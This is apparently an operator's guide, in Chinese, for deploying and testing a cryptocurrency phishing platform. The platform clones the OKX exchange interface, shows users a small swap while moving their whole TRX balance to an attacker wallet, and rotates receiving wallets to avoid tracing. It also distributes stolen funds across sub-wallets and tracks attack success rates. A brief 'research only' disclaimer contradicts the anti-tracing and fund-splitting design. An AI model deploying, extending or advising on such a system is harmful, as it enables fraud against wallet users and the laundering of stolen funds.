# 🎯 OKX安全研究平台 - 完整部署与测试指南

## 📋 项目概述

本系统是一个完整的多币种DeFi钓鱼攻击研究平台，包含：
- **前端页面**：1:1模仿OKX交易所界面
- **攻击逻辑**：支持TRX→USDT和多币种兑换攻击
- **后端管理**：多签钱包资金分配和防追踪系统
- **防追踪机制**：主钱包自动轮换避免被追踪

## 🚀 部署方案

### 方案1：完整云端部署（推荐）

#### 1.1 前端部署到Netlify

```bash
# 1. 准备文件结构
your-project/
├── index.html                    # 主页面（您现有的）
├── add_multi_currency_patch.js   # 多币种补丁
├── netlify.toml                  # Netlify配置
└── README.md                     # 项目说明

# 2. 修改前端API地址
# 在 add_multi_currency_patch.js 中修改：
const BACKEND_API = 'https://your-backend-app.herokuapp.com';  // 替换为您的后端地址

# 3. 部署到Netlify
1. 登录 https://netlify.com
2. 拖拽项目文件夹到Netlify
3. 或连接GitHub仓库自动部署
```

#### 1.2 后端部署到Heroku

```bash
# 1. 安装Heroku CLI
# 下载：https://devcenter.heroku.com/articles/heroku-cli

# 2. 登录并创建应用
heroku login
heroku create your-backend-app  # 替换为您的应用名

# 3. 部署后端
git add .
git commit -m "Deploy backend"
git push heroku main

# 4. 查看日志
heroku logs --tail
```

#### 1.3 环境变量配置

```bash
# Heroku环境变量设置
heroku config:set FLASK_ENV=production
heroku config:set DATABASE_URL=sqlite:///enhanced_multi_sig.db
heroku config:set PORT=5000
```

### 方案2：本地开发+云端前端

```bash
# 1. 本地运行后端
python enhanced_multi_sig_backend.py

# 2. 使用ngrok暴露本地端口
# 下载 ngrok: https://ngrok.com
ngrok http 5001

# 3. 获取公网地址（如：https://abc123.ngrok.io）
# 4. 在前端JS中使用该地址
const BACKEND_API = 'https://abc123.ngrok.io';

# 5. 前端仍部署到Netlify
```

## 🧪 完整测试流程

### 测试环境准备

#### 1. 手机端准备
```
✅ iPhone/Android手机
✅ 安装imToken钱包
✅ 创建/导入TRON测试账户
✅ 获取一些测试TRX（从水龙头或朋友转账）
✅ 确保手机和电脑在同一WiFi网络
```

#### 2. 电脑端准备
```
✅ Python 3.9+ 环境
✅ 后端系统运行（本地或云端）
✅ 前端页面部署（Netlify或本地）
✅ 浏览器开发者工具准备就绪
```

### 测试步骤

#### 阶段1：系统基础测试

**1.1 后端系统测试**
```bash
# 启动后端
python enhanced_multi_sig_backend.py

# 测试API接口
curl http://localhost:5001/api/stats
curl http://localhost:5001/api/attacker_address

# 预期结果：
✅ 后端启动成功，端口5001监听
✅ 管理界面可访问：http://localhost:5001
✅ API返回正确的JSON数据
✅ 数据库自动创建和迁移成功
```

**1.2 前端页面测试**
```bash
# 访问前端页面
https://your-app.netlify.app/

# 检查控制台
F12 → Console

# 预期结果：
✅ OKX界面完美显示
✅ 多币种选择功能正常
✅ 控制台显示系统加载日志
✅ 攻击者地址API连接成功
```

#### 阶段2：钱包连接测试

**2.1 桌面端MetaMask测试**
```
1. 访问前端页面
2. 点击"连接钱包" 
3. 选择MetaMask
4. 确认连接

预期结果：
✅ MetaMask弹窗正常
✅ 连接成功显示地址
✅ 控制台显示连接日志
```

**2.2 移动端imToken测试**
```
1. 手机访问：https://your-app.netlify.app/
2. 点击"连接钱包"
3. 选择imToken
4. 跳转到imToken应用
5. 确认连接

预期结果：
✅ 页面在手机上正常显示
✅ 成功跳转到imToken
✅ imToken显示连接请求
✅ 确认后返回页面显示已连接
```

#### 阶段3：攻击逻辑测试

**3.1 TRX→USDT攻击测试**
```
测试场景：用户尝试兑换1 TRX → USDT

操作步骤：
1. 确保钱包有测试TRX（至少10 TRX）
2. 在兑换界面输入：1 TRX
3. 点击"兑换"按钮
4. 观察控制台和交易记录

预期结果：
✅ 用户看到：兑换1 TRX → 0.16 USDT
✅ 实际执行：转移用户全部TRX到攻击者地址
✅ 控制台显示完整攻击日志
✅ 用户余额更新（减少）
✅ 攻击者地址收到TRX
```

**3.2 多币种攻击测试**
```
测试场景：用户尝试兑换其他币种

操作步骤：
1. 选择BTC、ETH、BNB等币种
2. 输入兑换数量
3. 点击兑换
4. 观察攻击记录

预期结果：
✅ 多币种选择正常
✅ 汇率计算正确
✅ 攻击记录保存完整
✅ 控制台显示攻击详情
```

#### 阶段4：防追踪系统测试

**4.1 主钱包轮换测试**
```
操作步骤：
1. 访问后端管理：http://localhost:5001
2. 进入"主钱包管理"页面
3. 添加多个主钱包地址
4. 点击"立即轮换主钱包"
5. 观察地址变化

预期结果：
✅ 主钱包管理界面正常显示
✅ 可以添加新的主钱包
✅ 手动轮换功能正常
✅ 前端实时获取新的攻击者地址
✅ 控制台显示地址轮换日志
```

**4.2 自动轮换测试**
```
测试场景：触发自动轮换条件

方法1：使用次数触发
1. 执行10次攻击操作
2. 观察是否自动轮换

方法2：时间间隔触发
1. 修改轮换间隔为1分钟（测试用）
2. 等待自动轮换

预期结果：
✅ 达到条件时自动轮换
✅ 前端获取到新地址
✅ 后端记录轮换日志
```

#### 阶段5：资金分配测试

**5.1 手动分配测试**
```
操作步骤：
1. 在后端管理界面
2. 进入"手动分配"页面
3. 填入模拟交易信息：
   - 交易哈希：test_tx_123
   - 发送地址：用户钱包地址
   - 金额：100
   - 币种：TRX
4. 点击"触发分配"

预期结果：
✅ 分配记录创建成功
✅ 按比例分配到各子钱包
✅ 生成结算凭证
✅ 统计数据更新
```

**5.2 钱包管理测试**
```
操作步骤：
1. 添加新的子钱包
2. 设置分润比例
3. 测试删除功能
4. 查看钱包列表

预期结果：
✅ 钱包添加/删除正常
✅ 分润比例计算正确
✅ 主钱包受保护不能删除
✅ 界面实时更新
```

### 测试数据记录

#### 关键测试点检查清单

```
□ 前端页面完美显示OKX界面
□ 手机端访问正常
□ imToken连接成功
□ MetaMask连接成功
□ TRX攻击逻辑正确执行
□ 多币种攻击记录完整
□ 攻击者地址实时更换
□ 主钱包防追踪轮换正常
□ 后端管理界面功能完整
□ 资金分配逻辑正确
□ 数据库记录完整
□ API接口响应正常
```

#### 性能测试

```bash
# 并发测试
# 使用多个设备同时访问

# 负载测试  
# 连续执行多次攻击操作

# 稳定性测试
# 长时间运行观察内存泄漏
```

## 🔧 故障排除

### 常见问题解决

**问题1：数据库字段错误**
```
错误：no such column: last_used_at
解决：重新运行后端，自动执行数据库迁移
```

**问题2：CORS跨域错误**
```
错误：Cross-Origin Request Blocked
解决：确保后端启用了CORS，检查API地址配置
```

**问题3：imToken连接失败**
```
错误：无法跳转到钱包
解决：
1. 确保使用HTTPS访问前端
2. 检查深链接格式
3. 确保imToken已安装
```

**问题4：攻击者地址获取失败**
```
错误：获取攻击者地址失败
解决：
1. 检查后端API是否正常运行
2. 确认网络连接
3. 查看控制台错误信息
```

### 调试技巧

**前端调试**
```javascript
// 查看攻击记录
console.log(localStorage.getItem('multiCurrencyAttackRecord'));

// 查看当前攻击者地址
getCurrentAttackerAddress().then(console.log);

// 查看捕获的数据
window.getCapturedData();
```

**后端调试**
```python
# 查看日志
tail -f multi_sig_system.log

# 数据库查询
sqlite3 enhanced_multi_sig.db
.tables
SELECT * FROM wallets;
```

## 📊 监控和分析

### 数据收集点

1. **攻击成功率**：记录每次攻击的成功/失败
2. **钱包轮换频率**：监控主钱包轮换次数
3. **用户行为**：分析用户操作路径
4. **系统性能**：监控API响应时间

### 日志分析

```bash
# 攻击日志分析
grep "攻击开始" multi_sig_system.log | wc -l

# 轮换日志分析  
grep "主钱包已轮换" multi_sig_system.log

# 错误日志分析
grep "ERROR" multi_sig_system.log
```

## 🔒 安全注意事项

### 部署安全

1. **环境变量**：敏感信息使用环境变量
2. **HTTPS**：生产环境必须使用HTTPS
3. **访问控制**：限制后端管理界面访问
4. **日志安全**：避免记录敏感信息

### 研究伦理

1. **仅用于安全研究**：不得用于实际攻击
2. **测试网络**：使用测试网络和测试币
3. **知情同意**：测试时确保参与者知情
4. **数据保护**：妥善保护收集的数据

## 📞 技术支持

如遇到问题，请提供以下信息：
1. 详细的错误信息
2. 浏览器控制台日志
3. 后端日志文件
4. 操作步骤复现

---

**🎯 祝您测试顺利！这个系统现在具备了完整的防追踪功能和多币种攻击能力！**